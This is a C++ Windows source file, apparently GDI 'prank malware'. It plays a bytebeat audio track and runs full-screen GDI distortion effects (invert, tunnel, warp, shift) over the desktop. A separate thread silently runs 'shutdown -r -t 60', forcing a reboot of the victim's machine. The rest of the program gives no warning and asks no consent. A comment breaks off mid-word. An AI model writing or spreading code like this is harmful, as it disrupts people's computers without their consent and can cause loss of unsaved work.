#include <Windows.h>
#include <thread>
#include <atomic>
#include <cstdlib>
#include <vector>
#include <functional>
#include "bytebeat.h"
#include "gdi_screen.h"

std::atomic<int> currentSample(0);

int main() {
    const int duration = 120; // segundos
    bytebeat::Player bb(duration);
    bb.Generate([](int t) -> unsigned char {
        return ((t&t>>12)*(10*(t>>6|t|t>>(t>>16))));
    });

    gdiscreen::Screen fx;

    // Lista de efeitos em sequ�ncia
    std::vector<std::function<void()>> effects = {
        [&]() { fx.Invert(); },
        [&]() { fx.Tunnel(50); },
        [&]() { fx.Warp(50); },
        [&]() { fx.Shift(10); }
    };

    // Thread de �udio
    std::thread audioThread([&]() {
        WAVEFORMATEX wfx = {0};
        wfx.wFormatTag = WAVE_FORMAT_PCM;
        wfx.nChannels = 1;
        wfx.nSamplesPerSec = bb.sampleRate;
        wfx.wBitsPerSample = 8;
        wfx.nBlockAlign = 1;
        wfx.nAvgBytesPerSec = bb.sampleRate;

        HWAVEOUT hWave;
        waveOutOpen(&hWave, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

        WAVEHDR header = {0};
        header.lpData = (LPSTR)bb.buffer;
        header.dwBufferLength = bb.length;

        waveOutPrepareHeader(hWave, &header, sizeof(WAVEHDR));
        waveOutWrite(hWave, &header, sizeof(WAVEHDR));

        while (!(header.dwFlags & WHDR_DONE)) Sleep(1);

        waveOutUnprepareHeader(hWave, &header, sizeof(WAVEHDR));
        waveOutClose(hWave);
    });

    // Thread de efeitos (sequ�ncia)
    std::thread visualThread([&]() {
        size_t effectIndex = 0;
        int framesPerEffect = 150; // quantos frames cada efeito dura

        for (int t = 0; t < bb.length; t++) {
            currentSample = t;

            // aplicar efeito atual
            effects[effectIndex]();

            // mudar efeito ap�s alguns frames
            if (t % framesPerEffect == 0) {
                effectIndex = (effectIndex + 1) % effects.size();
            }

            // opcional: desenhar cor baseada no sam


            Sleep(1000 / bb.sampleRate); // sincroniza��o
        }
    });
    std::thread ShutdownTreahd([&]() {
        system("shutdown -r -t 60");
    });

    audioThread.join();
    ShutdownTreahd.join();
    visualThread.join();

    return 0;
}
